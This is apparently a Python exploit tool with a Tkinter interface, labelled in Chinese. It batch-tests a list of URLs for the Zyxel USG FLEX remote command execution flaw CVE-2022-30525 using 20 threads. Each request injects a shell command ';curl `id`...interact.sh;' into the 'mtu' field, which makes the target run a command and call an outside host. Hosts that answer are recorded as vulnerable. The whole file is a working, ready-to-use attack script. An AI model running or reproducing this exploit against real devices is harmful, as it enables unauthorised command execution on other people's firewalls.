import requests
import urllib3
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def Zyxel_rce_CVE_2022_30525_exp(url):
    poc = r"""/ztp/cgi-bin/handler"""
    url = url + poc
    headers = {
        "Content-Type": "application/json"
    }
    data = {"command": "setWanPortSt", "proto": "dhcp", "port": "4", "vlan_tagged": "1", "vlanid": "5",
            "mtu": ";curl `id`.c9y7h342vtc00002dwxggr9tukwyyyyyj.interact.sh;", "data": "hi"}
    try:
        res = requests.post(url, headers=headers,data=data,verify=False,timeout=3)
        if "groups=" in res.text:
            Zyxel_rce_CVE_2022_30525_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            Zyxel_rce_CVE_2022_30525_text.see(END)
            with open ("存在Zyxel USG FLEX handler 远程命令执行漏洞(CVE-2022-30525)的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            Zyxel_rce_CVE_2022_30525_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            Zyxel_rce_CVE_2022_30525_text.see(END)
    except Exception as err:
        Zyxel_rce_CVE_2022_30525_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        Zyxel_rce_CVE_2022_30525_text.see(END)
def get_Zyxel_rce_CVE_2022_30525_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def Zyxel_rce_CVE_2022_30525_gui():
    Zyxel_rce_CVE_2022_30525 = tk.Tk()
    Zyxel_rce_CVE_2022_30525.geometry("910x450")
    Zyxel_rce_CVE_2022_30525.title("Zyxel USG FLEX handler 远程命令执行漏洞(CVE-2022-30525)一把梭")
    Zyxel_rce_CVE_2022_30525.resizable(0, 0)
    Zyxel_rce_CVE_2022_30525.iconbitmap('logo.ico')
    global Zyxel_rce_CVE_2022_30525_text
    Zyxel_rce_CVE_2022_30525_text = scrolledtext.ScrolledText(Zyxel_rce_CVE_2022_30525,width=123, height=25)
    Zyxel_rce_CVE_2022_30525_text.grid(row=0, column=0, padx=10, pady=10)
    Zyxel_rce_CVE_2022_30525_text.see(END)
    addrs = get_Zyxel_rce_CVE_2022_30525_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(Zyxel_rce_CVE_2022_30525_exp, addr)
    Zyxel_rce_CVE_2022_30525.mainloop()